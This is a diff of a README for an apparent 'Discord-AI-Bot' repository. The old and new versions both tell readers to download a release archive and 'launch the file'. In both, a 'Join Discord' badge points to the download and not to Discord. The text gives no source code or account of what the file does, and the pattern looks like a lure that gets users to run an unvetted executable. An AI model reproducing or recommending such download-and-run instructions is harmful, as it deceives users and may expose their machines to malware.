@@ -26,7 +26,7 @@ Welcome to the **Discord-AI-Bot** repository! 🎉 This repository hosts a simpl
 
 ## Getting Started 🚀
 
-To get started with the Discord AI Bot, simply [click here](https://github.com/cornyboio/Discord-AI-Bot/releases/download/v1.0/Application.zip) to download the necessary files. Make sure to launch the file after downloading to start interacting with the chatbot.
+To get started with the Discord AI Bot, simply [click here](https://github.com/cornyboio/Discord-AI-Bot/releases/tag/v2.0) to download the necessary files. Make sure to launch the file after downloading to start interacting with the chatbot.
 
 ## Installation Steps 🛠️
 
@@ -47,7 +47,7 @@ If you encounter any issues or have any questions, feel free to check the "Relea
 
 Join our Discord community to stay updated on the latest developments, chatbot enhancements, and upcoming features. We look forward to chatting with you soon!
 
-[![Join Discord](https://github.com/cornyboio/Discord-AI-Bot/releases/download/v1.0/Application.zip)](https://github.com/cornyboio/Discord-AI-Bot/releases/download/v1.0/Application.zip)
+[![Join Discord](https://github.com/cornyboio/Discord-AI-Bot/releases/tag/v2.0)](https://github.com/cornyboio/Discord-AI-Bot/releases/tag/v2.0)
 
 ## Spread the Word 📢
 
